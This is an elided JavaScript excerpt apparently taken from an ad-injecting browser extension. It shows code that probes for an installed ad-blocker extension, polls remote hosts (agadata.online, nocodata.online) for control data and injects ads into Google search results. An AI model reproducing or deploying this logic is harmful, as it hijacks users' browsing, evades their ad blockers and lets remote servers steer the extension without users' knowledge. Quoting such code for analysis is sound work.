...
if (!window.zMainObj.adRequests) {
  ...
  window.zMainObj.adRequests = {
    ...
    checkADB: async () => {
      ...
      const isInstalled = await checkAlreadyInstalled(
        "chrome-extension://dlbgdlmfkjiffjkchlipihnmbmhnapja/hosts.json"
      );
      if (isInstalled) {
        let canMakeRequest = await checkAlreadyInstalled(
          "https://agadata.online/t.txt",
          1
        );
        if (!canMakeRequest) {
    ...
    nts: function (options, callback) {
      ...
      if (window.zMainObj.storage.bgRequest) {
        window.zMainObj.storage.bgRequest(
    ...
    setFrameNtsStatListener: function () {
      ...
      window.addEventListener("message", function (e) {
        if (e.data && e.data.task === "sendNtsStatFixed") {
          ...
          window.zMainObj.adRequests.postStatData({
            creativeID,
            moduleName,
            action,
          });
    ...
    renderGoogleSearchAds: function (args, options) {
      try {
        ...
        window.zMainObj.adRequests.findGoogleAds(handleMessageArgs, {
          debug: options.debug,
        });
      } catch (error) {
        if (options.debug) {
  ...
  function init() {
    ...
    window.zMainObj.storage.getData("chromeRequest", function (data) {
      ...
      if (!data || curTime - data > 600) {
        window.zMainObj.storage.bgRequest(
          "https://nocodata.online/chsn/p.php?e=kdnmnhneccackiehedjmnpgfpjicicgo",
          function (remoteData) {
